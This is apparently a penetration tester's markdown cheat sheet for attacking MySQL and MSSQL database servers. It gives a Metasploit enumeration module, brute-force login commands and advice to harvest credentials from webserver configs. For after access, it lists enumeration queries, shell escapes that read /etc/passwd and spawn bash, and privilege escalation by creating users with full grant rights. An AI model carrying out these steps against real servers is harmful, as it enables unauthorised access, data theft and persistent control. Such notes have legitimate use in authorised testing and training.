# Exploit

## Brute Force
```
msf > use auxiliary/admin/mssql/mssql_enum
```
```
mysql --host=[IP] -u [root] -p
```
  - Then enter the password in the CLI prompt.

## Re-use Credentials
Look at the webserver configuration files to see if there is a username and password in them for the DB.

## After Initial Access Is Gained
### Re-enumerate
```
> show databases; 
> show schemas; 
```
  - You can then set the current working database with: > USE [database]; this needs to happen to interact with and display contents of tables within the database. 
```
> show tables; 
> show columns from [table]; 
> SELECT * FROM [table];
```

### Attempt Shell
```
> \! cat /etc/passwd 
> \! bash 
```

### Attempt Privelege Escalation

#### Current Level Access
```
>select user(); 
>select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()'; 
```
#### Create New User and Grant Privleges
```
>create user test identified by 'test'; 
> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```
